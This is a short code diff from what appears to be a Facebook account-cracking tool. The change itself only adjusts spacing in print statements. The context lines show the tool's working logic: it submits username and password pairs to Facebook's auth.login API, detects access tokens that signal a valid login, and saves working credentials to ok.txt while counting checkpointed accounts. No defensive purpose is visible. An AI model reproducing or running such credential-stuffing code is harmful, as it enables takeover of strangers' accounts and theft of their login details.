@@ -120,7 +120,7 @@ def moch_yayan():
              api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
              if 'EAA' in response.text:
-                 print(f"\r\033[1;92m * ---> {username}|{password}                       ",end="")
+                 print(f"\r\033[1;92m  * ---> {username}|{password}                       ",end="")
                  print()
                  result += 1
                  if cek:
@@ -129,7 +129,7 @@ def moch_yayan():
                         with open('ok.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
              elif 'www.facebook.com' in response.json()['error_msg']:
-                   print(f"\r\033[1;93m * ---> {username}|{password}                    ",end="")
+                   print(f"\r\033[1;93m  * ---> {username}|{password}                    ",end="")
                    print()
                    check += 1
                    if cek:
